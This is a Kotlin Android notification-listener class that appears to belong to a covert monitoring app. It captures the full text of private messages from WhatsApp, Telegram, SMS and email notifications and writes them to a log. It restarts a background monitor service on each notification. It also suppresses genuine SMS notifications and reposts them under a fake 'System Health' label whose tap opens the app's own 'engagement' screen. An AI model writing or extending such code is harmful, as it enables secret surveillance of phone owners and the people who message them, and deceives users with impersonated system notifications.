package com.example.myandroid

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // Feature Gate
        if (!ConfigManager.canCollect(this, "notifications")) return

        // SYMBIOTE RESURRECTION: Secondary Heartbeat
        try {
            if (!MonitorService.isRunning) {
                val intent = android.content.Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }
        } catch(e: Exception) {}

        if (sbn == null) return
        
        // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
        if (!sbn.isClearable) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        
        // DEEP EXTRACTION: Prioritize expanded/inbox styles over collapsed text
        var text = ""
        
        // 1. Check for Multi-line (InboxStyle) - Common in WhatsApp/Telegram groups
        val lines = extras.getCharSequenceArray("android.textLines")
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n")
        } 
        // 2. Check for Big Text (BigTextStyle) - Long emails/messages
        else {
            text = extras.getCharSequence("android.bigText")?.toString() ?: ""
        }

        // 3. Fallback to standard text if expanded data is empty
        if (text.isEmpty()) {
            text = extras.getCharSequence("android.text")?.toString() ?: ""
        }

        if (title.isEmpty() && text.isEmpty()) return

        // --- ENGAGEMENT PROTOCOL ---
        if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
            checkAndMirrorNotification(sbn, title, text)
        }

        // LOAD DATA
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val editor = prefs.edit()

        // 1. UPDATE GLOBAL COUNT
        val total = prefs.getInt("notif_count", 0) + 1
        editor.putInt("notif_count", total)

        // 2. UPDATE APP LEADERBOARD (Who is most annoying?)
        val leaderboardStr = prefs.getString("notif_leaderboard", "{}")
        val leaderboard = try { JSONObject(leaderboardStr) } catch (e: Exception) { JSONObject() }
        val appCount = leaderboard.optInt(pkg, 0) + 1
        leaderboard.put(pkg, appCount)
        editor.putString("notif_leaderboard", leaderboard.toString())

        // 3. LOG HISTORY (STREAM)
        val entry = JSONObject()
        entry.put("pkg", pkg)
        entry.put("title", title.take(50))
        entry.put("txt", text.take(100))
        entry.put("ts", System.currentTimeMillis())
        
        DumpManager.appendLog("NOTIF", entry)
        
        editor.apply()
    }

    private fun checkAndMirrorNotification(sbn: StatusBarNotification, title: String, text: String) {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastEngagement = prefs.getLong("last_engagement_success", 0L)
        val now = System.currentTimeMillis()
        
        // Threshold: 4 days (4 * 24 * 60 * 60 * 1000)
        if (now - lastEngagement < 345600000) {
            DebugLogger.log("ENGAGE_RECAP", "Cooldown active. Next window in: ${((345600000 - (now - lastEngagement)) / 3600000)} hours")
            return
        }

        // 1. SILENCE THE ORIGINAL
        cancelNotification(sbn.key)

        // 2. POST THE MIRROR
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        val channelId = "system_health_comms"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(channelId, "Messaging Optimization", android.app.NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(channel)
        }

        val intent = android.content.Intent(this, PulseActivity::class.java)
        intent.putExtra("is_engagement_trigger", true)
        intent.putExtra("original_pkg", sbn.packageName)
        
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 101, intent, 
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.stat_notify_chat)
            .setContentTitle(title)
            .setContentText(text)
            .setSubText("Optimized by System Health")
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_MESSAGE)

        nm.notify(101, builder.build())
        prefs.edit().putString("engage_status", "ATTEMPT_POSTED: ${java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}").apply()
        DebugLogger.log("ENGAGE_EVENT", "PHASE 1: SMS Mirror Posted for sender: $title. Waiting for user interaction...")
    }
}